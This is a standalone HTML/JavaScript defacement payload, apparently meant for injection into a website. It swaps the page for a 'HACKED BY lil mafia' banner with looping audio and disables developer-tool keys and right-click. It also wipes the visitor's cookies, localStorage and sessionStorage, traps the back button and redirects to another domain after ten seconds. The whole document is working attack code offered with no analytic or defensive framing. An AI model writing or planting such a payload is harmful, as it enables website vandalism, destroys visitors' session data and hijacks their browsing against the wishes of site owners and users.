<script>
(function() {
    // KILL EVERYTHING
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>HACKED BY lil mafia</title>
    <style>
        body {
            background: #000;
            color: #f00;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 5em;
            text-shadow: 0 0 10px #f00;
            animation: glitch 1s infinite;
        }
        @keyframes glitch {
            0% { transform: skew(0deg); }
            20% { transform: skew(-5deg); }
            40% { transform: skew(3deg); }
            60% { transform: skew(-2deg); }
            80% { transform: skew(1deg); }
            100% { transform: skew(0deg); }
        }
    </style>
</head>
<body>
    <h1>☠️ HACKED BY lil mafia ☠️</h1>
    <p>This site has been pwned.</p>
    <marquee behavior="scroll" direction="left" scrollamount="20">king of solo np gang</marquee>
    <audio autoplay loop>
        <source src="https://www.myinstants.com/media/sounds/error-sound-effect.mp3" type="audio/mpeg">
    </audio>
    <script>
        // Prevent recovery (disable F12, right-click, etc.)
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                e.preventDefault();
                alert('Nope. 😈');
            }
        });
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert('Right-click disabled. 😏');
        });
        // Redirect to a different page after 10 seconds
        setTimeout(() => {
            window.location.href = 'https://bdcgny.org';
        }, 10000);
    </script>
</body>
</html>
    `;
    
    // Clear all cookies, localStorage, and sessionStorage
    document.cookie.split(";").forEach(cookie => {
        document.cookie = cookie.replace(/^ +/, "").split("=")[0] + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    });
    localStorage.clear();
    sessionStorage.clear();
    
    // Disable back button
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.go(1);
    };
})();
</script>
